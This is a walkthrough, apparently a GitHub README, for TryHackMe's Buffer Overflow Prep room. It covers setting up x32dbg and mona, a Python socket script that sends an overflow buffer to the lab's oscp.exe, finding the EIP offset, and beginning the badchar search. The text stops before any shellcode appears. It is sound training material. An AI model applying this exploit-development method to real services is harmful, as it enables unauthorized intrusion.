# Buffer-Overflow-Prep
We're going to learn how to solve 3 tryhackme's stack buffer overflow.

This is the link to the Tryhackme Machine: https://tryhackme.com/room/bufferoverflowprep

# Things that you will need:
You will need x32dbg made by therealdreg: https://github.com/therealdreg/x64dbg-exploiting

[![18eaa8e03e02775805ec70f088604676.png](https://i.postimg.cc/6qzWgzJ9/18eaa8e03e02775805ec70f088604676.png)](https://postimg.cc/Pvpn8W5c)

You will need your OpenVPN from Tryhackme: https://tryhackme.com/access

You will need wfreerdp to get "vulnerable_apps.zip"

You can get it from here: https://ci.freerdp.com/job/freerdp-nightly-windows/arch=win32,label=vs2013/

[![e73bc927e928e9aac8a53960cfb34a08.png](https://i.postimg.cc/15ts4G1q/e73bc927e928e9aac8a53960cfb34a08.png)](https://postimg.cc/kDkkpt4J)

# First Steps

Start the machine in Tryhackme.

Open your OpenVPN and wait to connect to the machine, so we can work.

After downloading it all, We will need to execute this comand on cmd: ```wfreerdp.exe /u:admin /p:password /cert:ignore /v:MACHINE_IP /workarea```

[![11fd449aa4140dac4f71db16bbe012b2.png](https://i.postimg.cc/XqgPgzMg/11fd449aa4140dac4f71db16bbe012b2.png)](https://postimg.cc/0KbZkZy6)

Once we connect to the Tryhackme Machine, we can start to work!

On the Desktop is "vulnerable_apps", so we can right click it and make it a zip.

[![ddf3a6b17b9494a291f4f5c02fa15903.png](https://i.postimg.cc/sDqYNJVP/ddf3a6b17b9494a291f4f5c02fa15903.png)](https://postimg.cc/fJ7S3mSk)

Then in the windows machine we can found that we can use Python27 then we can get "vulnerable_apps.zip" via http server.

So knowing this we use on the cmd: ```c:\Python27\python.exe -m SimpleHTTPServer```

[![8ec396ffd688f7e79111b8edcfb31b3c.png](https://i.postimg.cc/g0S83yB6/8ec396ffd688f7e79111b8edcfb31b3c.png)](https://postimg.cc/Z9NWSNmT)

Back on your Windows search on google: ```MACHINEIP:8000```

[![88368624e10a140e81068e70fcea41ac.png](https://i.postimg.cc/SQrqdZf5/88368624e10a140e81068e70fcea41ac.png)](https://postimg.cc/3WdPJF6C)

Download "vulnerable_apps.zip" and unzip it.

# Using x32dgb

We will need a script to execute an exploit on the "oscp.exe"

Tryhackme give us this:

```
import socket

ip = "MACHINE_IP" # Here introduce 127.0.0.1 for local or TryHackme's Machine IP
port = 1337

prefix = "OVERFLOW1 "
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

We will start trying the exploit doing it in local, so we neet to introduce in the parameter "ip" 127.0.0.1

Run the program, and open the file "oscp.exe" it is in this path: ```vulnerable-apps/vulnerable-apps/oscp/oscp.exe```

[![7ee528397d8b95aa959aefcb51bca05b.png](https://i.postimg.cc/W1S9zHgG/7ee528397d8b95aa959aefcb51bca05b.png)](https://postimg.cc/dhkRSnW3)

Then you will see something like this:

[![a5255baed8f1aee8570dc9f6c68715b7.png](https://i.postimg.cc/SR1SRLLQ/a5255baed8f1aee8570dc9f6c68715b7.png)](https://postimg.cc/YLgKyWyT)

# Useful codes for x32dgb using mona

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
--------------------------------------------------------------------------------

mona.mona("pattern_create 2000")

mona.mona('bytearray -cpb "\\x00"')

mona.mona('compare -f C:\\logs\\oscp\\bytearray.bin -a ESP')

mona.mona("pattern_offset EIP")

mona.mona("jmp -r esp") 
```

# Starting with x32dgb on "oscp.exe"

Go to Log inside of x32dgb when "oscp.exe" it's open and execute this 3 commands one by one:

```
import mona
mona.mona("help")
mona.mona("config -set workingfolder c:\\logs\\%p")
```
You need to do this everytime you turn on your pc.

If you do this all right you'll see this with our last command:

[![cc593dbe3e7a6ab673d27fe1e4c1e1c7.png](https://i.postimg.cc/05CRfCwb/cc593dbe3e7a6ab673d27fe1e4c1e1c7.png)](https://postimg.cc/3WWcrm9T)

Now, we need to create a pattern, so we can know how much bytes can we put to get to EIP.

```mona.mona("pattern_create 2000")``` Enter this in "Log".

You should see this:

[![c1e9cbf34e1914f2504c149861837c32.png](https://i.postimg.cc/tC0ks0T6/c1e9cbf34e1914f2504c149861837c32.png)](https://postimg.cc/MXDVLF1Z)

Restart and Run your program a few times till it open this will be done everytime that we change the file.py

You need to execute your python3 in your cmd like this: ```c:\YOUR_PATERN_PYTHON3\python.exe YOUR.PY```

[![c5f08318b0473e0b4cf5922b81483227.png](https://i.postimg.cc/pTjBVkDx/c5f08318b0473e0b4cf5922b81483227.png)](https://postimg.cc/8J1vtRKn)

Now in "Log" we need to execute the command: ```"mona.mona("pattern_offset EIP")"``` 

This gonna compare our pattern to get how much bytes we need to get to EIP.

[![6632609ce31c786d0df06b32ed0d0d62.png](https://i.postimg.cc/nzLt6j7v/6632609ce31c786d0df06b32ed0d0d62.png)](https://postimg.cc/v1Cjnm0B)

We see that we need 1978 bytes to get to EIP so we gonna put this on payload: (\x41 means A in ASCII and \x42 means B in ASCII )

[![9509072bfe829744e9818c7d7c1944a8.png](https://i.postimg.cc/85qNMkJM/9509072bfe829744e9818c7d7c1944a8.png)](https://postimg.cc/hzbkqB0t)

We need to restart "oscp.exe" and run it till it's open. Execute your file.py and you should see this on EIP:

[![65dad277ef0a729dc5cc05b235340f9a.png](https://i.postimg.cc/hjqBpD1B/65dad277ef0a729dc5cc05b235340f9a.png)](https://postimg.cc/4Kwq3T0L)

We can see here "\x41" and "\x42" at the top of the stack.

[![49443394b4bce14e67c3cb45bd2d755d.png](https://i.postimg.cc/QCQwC129/49443394b4bce14e67c3cb45bd2d755d.png)](https://postimg.cc/9wfJNRFC)

If you can see this, all is going good! Well done!

Now it's time to search badchars

# Searching Badchars

Go to "Log", execute: ```mona.mona('bytearray -cpb "\\x00"')``` 

This will create a payload without the badchat \x00 that we asume that it's a badchar.

[![ac1ff2ab0df93fab77e2c6006d0f091d.png](https://i.postimg.cc/xdP2prxN/ac1ff2ab0df93fab77e2c6006d0f091d.png)](https://postimg.cc/zL363Q1q)

Paste it all into payload under ```payload+= "\x42" * 4``` 

All like this:

[![e91dc714947f2eb896159a816bc4e94b.png](https://i.postimg.cc/ydC41ZBw/e91dc714947f2eb896159a816bc4e94b.png)](https://postimg.cc/PLyFKNC4)

Now, We need to restart the program and run it again to execute our payload with the file.py

Every time you need to check that EIP got our 4 "\x42"(B).

Afther that go to the bottom zone and right click go to expresion : "esp"

![4fceda96673b99b5a5d7dadab39990bb](https://user-images.githubusercontent.com/107114264/172812663-6484278d-5063-4464-ae04-a44f765bf10b.gif)

